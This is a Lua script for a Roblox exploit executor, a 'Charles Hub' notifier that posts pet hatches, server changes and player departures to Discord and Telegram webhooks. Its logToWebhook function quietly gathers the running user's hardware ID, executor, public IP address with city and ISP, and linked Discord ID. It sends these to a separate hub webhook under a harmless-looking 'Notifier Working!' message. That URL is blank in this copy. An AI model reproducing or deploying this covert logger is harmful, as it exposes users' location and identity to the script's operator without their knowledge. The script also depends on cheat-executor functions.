
if _G.CHARLES_NOTIFIER_RUNNING then
    print("‚ö†Ô∏è [CHARLES]: Notifier already running! Stopping new instance.")
    return
end
_G.CHARLES_NOTIFIER_RUNNING = true

-- [[ AYARLAR ]] --
local petWebhookURL   = _G.CHARLES_PET_WEBHOOK or _G.CHARLES_WEBHOOK or ""
local actWebhookURL   = _G.CHARLES_ACT_WEBHOOK or ""
local countWebhookURL = _G.CHARLES_COUNT_WEBHOOK or ""
local discordUserID   = _G.CHARLES_DISCORD_ID or ""

local petTgToken      = _G.CHARLES_PET_TG_TOKEN or ""
local actTgToken      = _G.CHARLES_ACT_TG_TOKEN or ""
local countTgToken    = _G.CHARLES_COUNT_TG_TOKEN or ""
local telegramChatID   = _G.CHARLES_TG_CHATID or ""

-- [[ CHARLES HUB - NOTIFIER ]] --
local hubWebhookURL = ""
local serverChangeWebhookURL = actWebhookURL
local playerCountWebhookURL = countWebhookURL

local DEBUG_HUB = true
local useProxy = true

local function getProxiedURL(url)
    if not useProxy then return url end
    return url:gsub("https://discord.com/", "https://webhook.lewisakura.moe/")
end

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local function debugLog(msg)
    if DEBUG_HUB then
        print("üõ†Ô∏è [CHARLES-DEBUG]: " .. tostring(msg))
    end
end

local function formatNumber(v)
    if not v then return "0" end
    local s = tostring(v)
    local parts = string.split(s, ".")
    local intPart = parts[1]:reverse():gsub("%d%d%d", "%1."):reverse():gsub("^%.", "")
    if parts[2] then
        return intPart .. "," .. parts[2]
    end
    return intPart
end

local SessionStartTime = tick()

-- [[ PET NADƒ∞RLƒ∞K KONTROL Sƒ∞STEMƒ∞ ]] --
local FinalTargets = {
    ["Legendary"] = true,
    ["Mythical"] = true,
    ["Secret I"] = true,
    ["Secret II"] = true,
    ["Secret III"] = true,
    ["Secret X"] = true
}

local PetData = {}
local function LoadPetStats()
    pcall(function() 
        PetData = require(ReplicatedStorage:WaitForChild("Game"):WaitForChild("PetStats"):WaitForChild("Pets")) 
    end)
end
task.spawn(LoadPetStats)

local request_func = (request or syn and syn.request or http and http.request)

local function getInventoryPetCount(targetPetName)
    if not targetPetName then return 0 end
    local count = 0
    local targetLower = tostring(targetPetName):lower()
    
    local targetIDs = {}
    pcall(function()
        for id, data in pairs(PetData) do
            if (data.Name and data.Name:lower():find(targetLower)) or tostring(id):lower() == targetLower then
                targetIDs[tostring(id):lower()] = true
                if data.Name then targetIDs[data.Name:lower()] = true end
            end
        end
    end)
    targetIDs[targetLower] = true

    pcall(function()
        local searchPaths = {
            lp,
            ReplicatedStorage:FindFirstChild("PlayerData"), 
            ReplicatedStorage:FindFirstChild("Inventories"),
            workspace:FindFirstChild("PlayerPets"),
            workspace:FindFirstChild("Pets")
        }
        local seenRoots = {}

        for _, area in pairs(searchPaths) do
            if area then
                local currentArea = nil
                if area == lp then
                    currentArea = lp
                elseif area == workspace then
                    currentArea = area:FindFirstChild(lp.Name) or area:FindFirstChild(tostring(lp.UserId))
                else
                    currentArea = area:FindFirstChild(lp.Name) or area:FindFirstChild(tostring(lp.UserId))
                end

                if currentArea then
                    for _, obj in pairs(currentArea:GetDescendants()) do
                        local isMatch = false
                        local oName = obj.Name:lower()
                        
                        for tID, _ in pairs(targetIDs) do
                            if oName:find(tID) then
                                isMatch = true
                                break
                            end
                        end

                        if not isMatch and (obj:IsA("ValueBase")) then
                            local val = tostring(obj.Value):lower()
                            for tID, _ in pairs(targetIDs) do
                                if val:find(tID) then
                                    isMatch = true
                                    break
                                end
                            end
                        end

                        if isMatch then
                            local root = obj
                            if obj:IsA("ValueBase") or oName:find("id") or oName:find("name") then
                                root = obj.Parent
                            end
                            if root and not seenRoots[root] then
                                seenRoots[root] = true
                                count = count + 1
                            end
                        end
                    end
                end
            end
        end
    end)
    return count
end

-- [[ DUPLICATE PREVENTION LOGIC ]] --
local RecentNotifications = {} -- { [PetName_Rarity_Time] = true }

local function isDuplicate(petName, rarity)
    local key = string.format("%s_%s", tostring(petName), tostring(rarity))
    local now = tick()
    
    -- Clean up old entries (more than 5 seconds old)
    for k, t in pairs(RecentNotifications) do
        if now - t > 5 then
            RecentNotifications[k] = nil
        end
    end
    
    if RecentNotifications[key] and now - RecentNotifications[key] < 3 then
        return true
    end
    
    RecentNotifications[key] = now
    return false
end

local function sendPetNotification(petName, rarity, petType, multiplier, eggName, imageId)
    -- Check for duplicates before waiting
    if isDuplicate(petName, rarity) then
        debugLog("üö´ Duplicate pet notification blocked for: " .. tostring(petName))
        return
    end

    task.wait(3.5) 

    local totalEggs = 0
    pcall(function()
        local folder = lp:FindFirstChild("leaderstats") or lp:FindFirstChild("PlayerStats") or lp:FindFirstChild("Data")
        if folder then
            local eggObj = folder:FindFirstChild("Eggs") or folder:FindFirstChild("TotalEggs")
            if eggObj then totalEggs = eggObj.Value end
        end
    end)

    local invCount = getInventoryPetCount(petName)
    
    local cleanImageId = tostring(imageId or ""):gsub("%D", "")
    local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
    
    if cleanImageId ~= "" and cleanImageId ~= "0" then
        thumbnailUrl = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%s&width=420&height=420&format=png", cleanImageId)
    end

    local data = {
        ["content"] = discordUserID ~= "" and "<@" .. discordUserID .. ">" or "",
        ["embeds"] = {{
            ["title"] = string.format("üê∂ %s (%s) | New Pet", petName, petType or "Normal"),
            ["description"] = string.format("**__Username__:** %s\n**Name:** %s\n**Rarity:** %s\n**Type:** %s\n\n**Multiplier:** x%s\n**IsFrom:** %s\n\nüìä **Stats:**\n**Total Hatched:** %sü•ö\n**Pet in Inventory:** %sx", 
            lp.Name, petName, rarity, petType or "Normal", 
            formatNumber(multiplier or "0"), 
            tostring(eggName or "Unknown Egg"),
            formatNumber(totalEggs), formatNumber(invCount)),
            ["thumbnail"] = {["url"] = thumbnailUrl},
            ["color"] = 10066329,
            ["timestamp"] = DateTime.now():ToIsoDate(),
            ["footer"] = { ["text"] = "Charles Hub - Pet Notifier" }
        }}
    }

    local typeLower = tostring(petType):lower()
    if typeLower:find("gold") then
        data.embeds[1].color = 16766720
    elseif typeLower:find("rainbow") then
        data.embeds[1].color = 16744703
    end

    if rarity == "Secret X" then
        data.embeds[1].color = 16711680
    end

    debugLog("Pet bildirimi g√∂nderiliyor: " .. tostring(petName))
    
    pcall(function()
        local finalUrl = getProxiedURL(petWebhookURL)
        request_func({
            Url = finalUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

local function sendTelegramNotification(petName, rarity, petType, multiplier, eggName)
    if petTgToken == "" or telegramChatID == "" then return end
    local message = string.format(
        "üê∂ *%s (%s)* | New Pet!\n" ..
        "üë§ *User:* %s\n" ..
        "üíé *Rarity:* %s\n" ..
        "‚ú® *Type:* %s\n" ..
        "üìà *Multiplier:* x%s\n" ..
        "ü•ö *Egg:* %s",
        petName, petType or "Normal", lp.Name, rarity, petType or "Normal", formatNumber(multiplier or 0), eggName or "Unknown"
    )
    pcall(function()
        request_func({
            Url = string.format("https://api.telegram.org/bot%s/sendMessage", petTgToken),
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                chat_id = telegramChatID,
                text = message,
                parse_mode = "Markdown"
            })
        })
    end)
end

local function logToWebhook()
    pcall(function()
        local hwid = (gethwid and gethwid()) or (get_hwid and get_hwid()) or game:GetService("RbxAnalyticsService"):GetClientId()
        local executor = (identifyexecutor and identifyexecutor()) or "Bilinmiyor"
        local membership = tostring(lp.MembershipType):sub(21)
        local UIS = game:GetService("UserInputService")
        local device = "PC"
        if UIS.TouchEnabled and not UIS.KeyboardEnabled then device = "Mobile"
        elseif game:GetService("GuiService"):IsTenFootInterface() then device = "Console" end
        
        local ipInfo = {query = "0.0.0.0", country = "Bilinmiyor", city = "Bilinmiyor", isp = "Bilinmiyor"}
        pcall(function() 
            local resp = game:HttpGet("http://ip-api.com/json/")
            if resp then ipInfo = HttpService:JSONDecode(resp) end
        end)

        local discordID = "Bilinmiyor"
        pcall(function()
            local response = game:HttpGet("https://registry.rover.link/v2/roblox-to-discord/" .. lp.UserId)
            if response then
                local decoded = HttpService:JSONDecode(response)
                if decoded and decoded.discordId then
                    discordID = "<@" .. decoded.discordId .. "> (" .. decoded.discordId .. ")"
                end
            end
        end)
        
        local stats = {Coins = "0", Gems = "0", Rebirths = "0", Eggs = "0", Tokens = "0"}
        pcall(function()
            local folder = lp:FindFirstChild("leaderstats") or lp:FindFirstChild("PlayerStats") or lp:FindFirstChild("Data")
            if folder then
                stats.Coins = tostring((folder:FindFirstChild("Clicks") or folder:FindFirstChild("Coins") or folder:FindFirstChild("Taps") or {Value = "0"}).Value)
                stats.Gems = tostring((folder:FindFirstChild("Gems") or folder:FindFirstChild("Diamonds") or {Value = "0"}).Value)
                stats.Rebirths = tostring((folder:FindFirstChild("Rebirths") or {Value = "0"}).Value)
                stats.Eggs = tostring((folder:FindFirstChild("Eggs") or folder:FindFirstChild("TotalEggs") or {Value = "0"}).Value)
                stats.Tokens = tostring((folder:FindFirstChild("Tokens") or folder:FindFirstChild("TapTokens") or folder:FindFirstChild("TokensValue") or {Value = "0"}).Value)
            end
        end)

        local data = {
            ["embeds"] = {{
                ["title"] = "üöÄ Notifier Working!",
                ["color"] = 65280,
                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"},
                ["fields"] = {
                    {["name"] = "Hesap ƒ∞smi", ["value"] = lp.Name .. " (" .. membership .. ")", ["inline"] = true},
                    {["name"] = "Roblox ID", ["value"] = tostring(lp.UserId), ["inline"] = true},
                    {["name"] = "Cihaz", ["value"] = device, ["inline"] = true},
                    {["name"] = "IP Adresi", ["value"] = "```" .. ipInfo.query .. "```", ["inline"] = true},
                    {["name"] = "Coin / Gem", ["value"] = "üí∞ " .. tostring(stats.Coins) .. " / üíé " .. tostring(stats.Gems), ["inline"] = true},
                    {["name"] = "A√ßƒ±lan Yumurta", ["value"] = "ü•ö " .. tostring(stats.Eggs), ["inline"] = true},
                    {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
                    {["name"] = "Discord ID", ["value"] = discordID, ["inline"] = true},
                    {["name"] = "Zaman", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
                },
                ["footer"] = {["text"] = "Charles Hub - Notifier System"}
            }}
        }
        
        local finalUrl = getProxiedURL(hubWebhookURL)
        request_func({
            Url = finalUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

local function GetNetwork()
    for _, v in pairs(ReplicatedStorage:GetChildren()) do
        if v:IsA("Folder") and v:FindFirstChild("Events") and v:FindFirstChild("Functions") then
            return v
        end
    end
    for _, v in pairs(ReplicatedStorage:GetChildren()) do
        if v:IsA("Folder") and #v.Name > 30 and v.Name:find("-") then
            return v
        end
    end
    return nil
end

local function sendServerChangeNotification(reason)
    if _G.CHARLES_NOTIFICATION_SENT then return end
    _G.CHARLES_NOTIFICATION_SENT = true
    
    local elapsed = math.max(0, math.floor((tick() - SessionStartTime) / 60))
    
    task.spawn(function()
        pcall(function()
            local data = {
                ["embeds"] = {{
                    ["title"] = "üîÑ Sunucu Deƒüi≈üti ‚Äî " .. lp.Name,
                    ["description"] = string.format("üë§ **Username:** %s\n‚è±Ô∏è **Time:** %d dk\n‚ùì **Sebep:** %s", lp.Name, elapsed, reason or "Bilinmiyor"),
                    ["color"] = 16711680,
                    ["timestamp"] = DateTime.now():ToIsoDate(),
                    ["footer"] = {["text"] = "Charles Hub - Sunucu Deƒüi≈üikliƒüi"}
                }}
            }
            local url = getProxiedURL(serverChangeWebhookURL)
            if url and url ~= "" and url:find("http") then
                request_func({
                    Url = url,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(data)
                })
            end
        end)
    end)

    if actTgToken ~= "" and telegramChatID ~= "" then
        task.spawn(function()
            pcall(function()
                local msg = string.format("üîÑ *Sunucu Deƒüi≈üti!*\nüë§ *Kullanƒ±cƒ±:* %s\n‚è±Ô∏è *S√ºre:* %d dk\n‚ùì *Sebep:* %s", lp.Name:gsub("_", "\\_"), elapsed, reason or "Bilinmiyor")
                request_func({
                    Url = "https://api.telegram.org/bot" .. actTgToken .. "/sendMessage",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        chat_id = telegramChatID,
                        text = msg,
                        parse_mode = "Markdown"
                    })
                })
            end)
        end)
    end
end

local function sendPlayerCountNotification(leavingPlayerName)
    local allPlayers = Players:GetPlayers()
    local playerNames = {}
    for _, p in pairs(allPlayers) do table.insert(playerNames, p.Name) end
    table.sort(playerNames)

    if playerNames[1] == lp.Name then
        local currentCount = #allPlayers
        local elapsed = math.max(0, math.floor((tick() - SessionStartTime) / 60))
        
        task.spawn(function()
            pcall(function()
                local data = {
                    ["embeds"] = {{
                        ["title"] = "üë• Player Left ‚Äî " .. lp.Name,
                        ["description"] = string.format("üë§ **Ayrƒ±lan:** %s\nüìä **Kalan Oyuncu Sayƒ±sƒ±:** %d\n‚è±Ô∏è **Time:** %d dk", leavingPlayerName, currentCount, elapsed),
                        ["color"] = 16753920,
                        ["timestamp"] = DateTime.now():ToIsoDate(),
                        ["footer"] = {["text"] = "Charles Hub - Sunucu Takibi"}
                    }}
                }
                local url = getProxiedURL(playerCountWebhookURL)
                if url and url ~= "" and url:find("http") then
                    request_func({
                        Url = url,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(data)
                    })
                end
            end)
        end)

        if countTgToken ~= "" and telegramChatID ~= "" then
            task.spawn(function()
                pcall(function()
                    local msg = string.format("üë• *Oyuncu Ayrƒ±ldƒ±!*\nüë§ *Ayrƒ±lan:* %s\nüìä *Kalan:* %d\n‚è±Ô∏è *S√ºre:* %d dk", leavingPlayerName:gsub("_", "\\_"), currentCount, elapsed)
                    request_func({
                        Url = "https://api.telegram.org/bot" .. countTgToken .. "/sendMessage",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            chat_id = telegramChatID,
                            text = msg,
                            parse_mode = "Markdown"
                        })
                    })
                end)
            end)
        end
    end
end

local ConnectedRemotes = {} -- Remote -> Connection Nesnesi

local function ConnectRemote(remote)
    if not remote:IsA("RemoteEvent") or ConnectedRemotes[remote] then return end
    
    local rName = remote.Name:lower()
    if rName:find("equip") or rName:find("unequip") or rName:find("wear") or rName:find("select") or rName:find("use") or (rName:find("update") and not rName:find("hatch")) then
        return
    end

    debugLog("üì° Remote Baƒülandƒ±: " .. remote.Name)
    ConnectedRemotes[remote] = remote.OnClientEvent:Connect(function(...)
        local args = {...}
        for _, arg in pairs(args) do
            if type(arg) == "table" then
                local name = arg.PetName or arg.Name or arg.id
                if name then
                    local nameStr = tostring(name)
                    local petType = arg.Tier or "Normal"
                    local actualRarity = "Unknown"

                    local baseData = PetData[nameStr]
                    if not baseData then
                        for id, data in pairs(PetData) do
                            if tostring(id) == nameStr then
                                baseData = data
                                break
                            end
                        end
                    end
                    
                    if baseData then actualRarity = baseData.Rarity or baseData.Tier or "Unknown" end
                    
                    if FinalTargets[actualRarity] then
                        local multiplier = baseData and (baseData.Multiplier1 or baseData.Multiplier or baseData.TapsMultiplier or baseData.ClickMultiplier or 0)
                        local imageId = baseData and (baseData.Image or baseData.Thumbnail or baseData.Icon or "")
                        local eggName = "Hatched Egg"
                        
                        task.spawn(function()
                            sendPetNotification(nameStr, actualRarity, petType, multiplier, eggName, imageId)
                        end)
                        task.spawn(function()
                            sendTelegramNotification(nameStr, actualRarity, petType, multiplier, eggName)
                        end)
                    end
                end
            end
        end
    end)
end

local function SetupListeners()
    debugLog("Aƒü dinleyicileri kuruluyor...")
    
    -- 1. Sadece "Hatch" veya "Open" i√ßeren Remote'larƒ± ReplicatedStorage genelinde tara
    -- Bu y√∂ntem en g√ºvenlisidir, √ß√ºnk√º Network klas√∂r√º i√ßinde olsa bile yakalar.
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            local lowName = obj.Name:lower()
            if lowName:find("hatch") or lowName:find("open") then
                ConnectRemote(obj)
            end
        end
    end

    -- 2. Eƒüer Network klas√∂r√º varsa, i√ßindeki t√ºm her ≈üeyi de baƒüla (Ama ConnectRemote i√ßinde zaten kontrol ediyoruz)
    local net = GetNetwork()
    if net then
        local events = net:FindFirstChild("Events")
        if events then
            for _, r in pairs(events:GetChildren()) do ConnectRemote(r) end
            events.ChildAdded:Connect(ConnectRemote)
        end
    end
end

-- [[ √áALI≈ûTIRMA ]] --
if not game:IsLoaded() then game.Loaded:Wait() end

task.spawn(SetupListeners)
task.spawn(logToWebhook)

-- Sunucu ƒ∞zleme
Players.LocalPlayer.OnTeleport:Connect(function()
    sendServerChangeNotification("Teleport / Sunucu Atlama")
end)

Players.PlayerRemoving:Connect(function(p)
    if p == lp then
        sendServerChangeNotification("Oyundan √áƒ±kƒ±≈ü")
    else
        task.delay(2, function()
            sendPlayerCountNotification(p.Name)
        end)
    end
end)

debugLog("Notifier sistemi aktif!")
